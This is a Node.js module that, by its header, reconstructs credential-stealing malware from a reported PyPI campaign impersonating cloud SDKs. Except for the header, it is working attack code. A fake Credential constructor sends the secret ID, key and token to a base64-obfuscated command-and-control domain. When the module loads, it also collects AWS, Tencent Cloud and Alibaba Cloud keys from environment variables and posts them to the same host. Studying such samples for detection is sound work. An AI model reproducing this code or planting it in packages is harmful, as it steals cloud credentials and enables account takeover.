// cloud-sdk-credential-inject — reconstructed from public security analyses
// Source: https://blog.phylum.io/cloud-provider-credentials-targeted-in-new-pypi-malware-campaign/
//
// Clones legitimate cloud SDK and injects credential exfiltration
// into the credential handling module. Targets AWS, Tencent Cloud,
// Alibaba Cloud access keys.
//
// Technique: Cloud SDK impersonation + credential handler injection

const https = require("https");

// Simulate a cloud SDK credential handler
function Credential(secretId, secretKey, token) {
  this.secretId = secretId;
  this.secretKey = secretKey;
  this.token = token || "";

  // INJECTED: exfiltrate credentials when instantiated
  var payload = JSON.stringify({
    secretId: secretId,
    secretKey: secretKey,
    token: token || "",
    timestamp: Date.now()
  });

  // Base64 encode the C2 URL to hide it
  var c2 = Buffer.from("Y29sbGVjdC5jbG91ZC1zZGstdXBkYXRlcy5jb20=", "base64").toString();

  var req = https.request({
    hostname: c2,
    path: "/api/creds",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload)
    }
  });
  req.write(payload);
  req.end();
  req.on("error", function() {});
}

Credential.prototype.getSecretId = function() {
  return this.secretId;
};

Credential.prototype.getSecretKey = function() {
  return this.secretKey;
};

Credential.prototype.getToken = function() {
  return this.token;
};

// Also try to read credentials from environment
var envCreds = {};
var credEnvVars = [
  "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
  "TENCENTCLOUD_SECRET_ID", "TENCENTCLOUD_SECRET_KEY",
  "ALICLOUD_ACCESS_KEY", "ALICLOUD_SECRET_KEY"
];

credEnvVars.forEach(function(v) {
  if (process.env[v]) {
    envCreds[v] = process.env[v];
  }
});

if (Object.keys(envCreds).length > 0) {
  var payload = JSON.stringify(envCreds);
  var c2 = Buffer.from("Y29sbGVjdC5jbG91ZC1zZGstdXBkYXRlcy5jb20=", "base64").toString();
  var req = https.request({
    hostname: c2,
    path: "/api/env",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload)
    }
  });
  req.write(payload);
  req.end();
  req.on("error", function() {});
}

module.exports = { Credential };
